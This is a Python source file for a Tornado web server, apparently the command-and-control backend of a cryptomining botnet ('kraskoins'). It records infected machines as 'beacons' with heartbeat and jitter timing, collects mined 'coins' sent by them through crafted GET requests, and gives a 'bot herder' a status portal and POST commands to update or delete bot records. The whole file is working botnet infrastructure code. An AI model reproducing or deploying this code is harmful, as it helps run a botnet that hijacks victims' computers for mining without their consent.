import os
import sys
import datetime
import tornado.ioloop
import tornado.web
import tornado.escape
#this is new#
# from tornado.httpserver import HTTPServer
#-----------#
from sqlalchemy import *
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
from mako.template import Template
from mako.lookup import TemplateLookup

Base = declarative_base()

class Beacons(Base):
    __tablename__ = 'beacons'
    id = Column(Integer, primary_key=True)
    ip = Column(String(15))
    mid = Column(String(250), nullable=False)
    heartbeat = Column(Integer, nullable=False)
    jitter = Column(Integer, nullable=False)
    lastCheckIn = Column (DateTime)
    nextCheckIn = Column (DateTime)

class Coins(Base):
    __tablename__ = 'coins'
    id = Column(Integer, primary_key=True)
    mid = Column(String(250), ForeignKey('beacons.mid'))
    kk = Column(Integer, nullable=False)

class dbMethods():

    def __init__(self, db):
        self.engine = create_engine(db)
        self.maker = sessionmaker(bind=self.engine)
        self.session = self.maker()

    def create(self):    #create the DB
        Base.metadata.create_all(self.engine)

    def ProcessBeacon(self, u, ip):
        #handle existing beacons
        if self.session.query(exists().where(Beacons.mid == u)).scalar():
            beacon = self.session.query(Beacons).filter_by(mid=u).one()
            offset = beacon.heartbeat + beacon.jitter
            lci = datetime.datetime.now()
            nci = lci + datetime.timedelta(seconds = offset)
            beacon.lastCheckIn = lci
            beacon.nextCheckIn = nci
            beacon.ip = ip
            print('Beacon check in, next check in: {}'.format(beacon.nextCheckIn))
            self.session.commit()
            return
        #handle new beacons
        else:
            lci = datetime.datetime.now()
            nci = lci + datetime.timedelta(seconds = 45)
            new_beacon = Beacons(mid=u, heartbeat=30, jitter=15, lastCheckIn=lci, nextCheckIn=nci)
            print('New beacon, next check in: {}'.format(nci))
            self.session.add(new_beacon)
            self.session.commit()

    def ListBeacons(self):
        beacons = self.session.query(Beacons).all()
        return beacons

    def UpdateBeacon(self, u, h, j):
        beacon = self.session.query(Beacons).filter_by(mid=u).one()

        #heartbeat shouldn't be smaller than jitter when setting heartbeat
        if int(h) >= int(j):
            beacon.heartbeat = h
        else:    #heartbeat is smaller: set heartbeat and set jitter to 0
            beacon.heartbeat = h
            beacon.jitter = 0

        #jitter shouldn't be greater than heartbeat when setting jitter
        if int(j) <= int(h):
            beacon.jitter = j
        else:    #jitter is greater: keep old value
            beacon.jitter = beacon.jitter

        self.session.commit()

    def DeleteBeacon(self, u):
        beacon = self.session.query(Beacons).filter_by(mid=u).one()
        self.session.delete(beacon)
        self.session.commit()

    def newCoin(self, m, k):
        if self.session.query(exists().where(Coins.kk == k)).scalar():
            return
        else:
            new_coin = Coins(mid=m, kk=k)
            self.session.add(new_coin)
            self.session.commit()
            print('Coin recieved from {}'.format(m))

class CoinRequestHandler(tornado.web.RequestHandler):

    def get(self):    #Coms from beacons will be via crafted GETs
        x_real_ip = self.request.headers.get("X-Real-IP")
        remote_ip = x_real_ip or self.request.remote_ip
        print(remote_ip)
        print(repr(self.request))
        self.command = self.get_argument('c')
        if self.command == "BCH":    #Beacon Call Home
            self.mid = self.get_argument('m')
            self.application.db.ProcessBeacon(self.mid, remote_ip)
            beacon = self.application.db.session.query(Beacons).filter_by(mid=self.mid).one()
            json = tornado.escape.json_encode(dict(h=beacon.heartbeat, j=beacon.jitter))
            self.write(json)
        elif self.command == "CCH":    #Coin Call Home
            self.mid = self.get_argument('m')
            self.kk = self.get_argument('k')
            self.application.db.newCoin(self.mid, self.kk)

class StatusHandler(tornado.web.RequestHandler):

    def post(self):    #post to handle commands from bot herder
        self.command = self.get_argument('c')
        if self.command == "DBR":   #Delete Beacon Record
            self.uuid = self.get_argument('uuid')
            self.application.db.DeleteBeacon(self.uuid)
        elif self.command == "UBR":    #Update Beacon Record
            self.uuid = self.get_argument('uuid')
            self.heartbeat = self.get_argument('h')
            self.jitter = self.get_argument('j')
            self.application.db.UpdateBeacon(self.uuid, self.heartbeat, self.jitter)

    def get(self):    #get to serve the info portal
        tl = TemplateLookup(directories=['.'])
        t = tl.get_template('status.mako')
        self.write(t.render(beacons = self.application.db.ListBeacons()))

class MinerServer(tornado.web.Application):

    def __init__(self):

        self.clients = {}
        self.db = dbMethods('sqlite:///kraskoins.db')
        self.db.create()

        super().__init__([
            (r'/kk', CoinRequestHandler),
            (r'/status', StatusHandler)
            ])

def main():
    print('Server started.')
    app = MinerServer()
    app.listen(8888, xheaders = True)
    tornado.ioloop.IOLoop.current().start()

if __name__ == "__main__":
    main()
